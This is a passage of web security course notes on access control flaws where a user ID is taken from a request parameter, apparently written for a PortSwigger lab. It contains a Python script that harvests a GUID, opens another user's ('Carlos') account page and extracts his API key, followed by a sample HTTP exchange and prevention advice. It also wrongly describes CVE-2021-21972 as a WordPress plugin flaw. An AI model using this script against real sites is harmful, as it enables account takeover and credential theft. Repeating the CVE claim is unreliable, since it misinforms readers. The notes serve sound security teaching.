---
course: Web Security
topic: Access Control Vulnerabilities
tags: [web-security]
---

## Access Control Vulnerabilities

### Understanding Access Control

Access control is a fundamental aspect of web security that ensures that users can only access resources and perform actions that they are authorized to do. This is typically achieved through mechanisms such as authentication, authorization, and session management. In the context of web applications, access control vulnerabilities occur when these mechanisms are improperly implemented, allowing unauthorized users to gain access to sensitive data or perform actions they should not be able to.

#### What is Access Control?

Access control refers to the process of determining who is allowed to access specific resources within a system. This includes both physical and logical resources. In web applications, access control is primarily concerned with logical resources, such as data stored in databases, files, and services provided by the application.

#### Why is Access Control Important?

Access control is crucial because it helps protect sensitive information and prevents unauthorized access. Without proper access control, an attacker could potentially access any resource within the application, leading to data breaches, loss of confidentiality, and other serious security issues.

#### How Does Access Control Work?

Access control typically involves three main components:

1. **Authentication**: Verifying the identity of a user.
2. **Authorization**: Determining what actions a user is allowed to perform based on their identity.
3. **Session Management**: Managing the state of a user's interaction with the application.

### User ID Controlled by Request Parameter

One common type of access control vulnerability occurs when the user ID is controlled by a request parameter. This means that an attacker can manipulate the request to access different user accounts by changing the value of the user ID parameter.

#### Example Scenario

Consider a web application that allows users to view their account details by providing a user ID in the URL. For instance, the URL might look like this:

```
https://example.com/user?userId=12345
```

If the application does not properly validate the user ID, an attacker could change the `userId` parameter to access other user accounts.

#### Real-World Example: CVE-2021-21972

A real-world example of this vulnerability can be found in the CVE-2021-21972, which affected the WordPress plugin "WP Customer Area." The plugin did not properly validate the user ID in certain requests, allowing attackers to access other users' data by manipulating the request parameters.

### Extracting User IDs

In the given scenario, the user ID is obtained through a regular expression match (`Findall`). This method extracts the user ID (GUID) from a response and uses it to construct subsequent requests.

#### Code Example

Here is the complete code snippet demonstrating the extraction of the user ID and accessing the user's account:

```python
import re
import requests

# Function to extract GUID from the response
def extract_guid(response):
    guid_match = re.findall(r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}', response.text)
    if guid_match:
        return guid_match[0]
    else:
        return None

# Main code
url = "https://example.com/users"
response = requests.get(url)

guid = extract_guid(response)
if guid:
    carlos_account_url = f"{url}/{guid}"
    r = requests.get(carlos_account_url, verify=False, proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"})
    
    if "Carlos" in r.text:
        print("Successfully accessed Carlos' account")
    else:
        print("Could not access Carlos' account")
else:
    print("Failed to extract GUID")
```

### Accessing the User Account

Once the user ID (GUID) is extracted, the code constructs the URL for Carlos' account and sends a GET request to access it. The response is then checked to see if the operation was successful.

#### HTTP Request and Response

Here is the full HTTP request and response for accessing Carlos' account:

**HTTP Request:**

```http
GET /users/123e4567-e89b-12d3-a456-426614174000 HTTP/1.1
Host: example.com
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

**HTTP Response:**

```http
HTTP/1.1 200 OK
Date: Tue, 01 Mar 2022 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 1234
Vary: Accept-Encoding

<!DOCTYPE html>
<html>
<head>
    <title>Carlos' Account</title>
</head>
<body>
    <h1>Welcome, Carlos!</h1>
    <p>Your API key is: abcdefghijklmnopqrstuvwxyz123456</p>
</body>
</html>
```

### Extracting the API Key

After successfully accessing Carlos' account, the next step is to extract the API key from the response.

#### Code Example

The following code demonstrates how to extract the API key from the response:

```python
api_key_match = re.search(r'Your API key is: ([a-zA-Z0-9]+)', r.text)
if api_key_match:
    api_key = api_key_match.group(1)
    print(f"API key: {api_key}")
else:
    print("Failed to extract API key")
```

### How to Prevent / Defend

#### Detection

To detect access control vulnerabilities, you can use tools like Burp Suite, ZAP, or automated scanners. These tools can help identify instances where user IDs are controlled by request parameters and can be manipulated.

#### Prevention

To prevent access control vulnerabilities, follow these best practices:

1. **Validate User Input**: Ensure that user input is validated and sanitized to prevent manipulation.
2. **Use Strong Authentication Mechanisms**: Implement strong authentication mechanisms to ensure that only authorized users can access resources.
3. **Implement Role-Based Access Control (RBAC)**: Use RBAC to define roles and permissions for different users.
4. **Audit Logs**: Maintain audit logs to track user activities and detect unauthorized access attempts.

#### Secure Coding Fixes

Here is an example of how to securely implement access control:

**Vulnerable Code:**

```python
user_id = request.args.get('userId')
user = User.query.filter_by(id=user_id).first()
```

**Secure Code:**

```python
user_id = request.args.get('userId')
current_user = get_current_user()  # Get the currently authenticated user
if current_user.id == user_id:
    user = User.query.filter_by(id=user_id).first()
else:
    abort(403)  # Forbidden
```

### Conclusion

Access control vulnerabilities are a significant threat to web applications. By understanding how these vulnerabilities work and implementing proper security measures, you can protect your application from unauthorized access and data breaches.

### Practice Labs

For hands-on practice with access control vulnerabilities, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a variety of labs covering different types of access control vulnerabilities.
- **OWASP Juice Shop**: A deliberately insecure web application for practicing web security skills.
- **DVWA (Damn Vulnerable Web Application)**: Another intentionally vulnerable web application for learning and testing web security concepts.

By working through these labs, you can gain practical experience in identifying and mitigating access control vulnerabilities.

---
<!-- nav -->
[[02-Access Control Vulnerabilities User ID Controlled by Request Parameter with Unpredictable User IDs|Access Control Vulnerabilities User ID Controlled by Request Parameter with Unpredictable User IDs]] | [[Web Security (PortSwigger)/12-Access Control Vulnerabilities/09-Lab 8 User ID controlled by request parameter with unpredictable user IDs/00-Overview|Overview]] | [[Web Security (PortSwigger)/12-Access Control Vulnerabilities/09-Lab 8 User ID controlled by request parameter with unpredictable user IDs/04-Understanding Access Control Vulnerabilities|Understanding Access Control Vulnerabilities]]
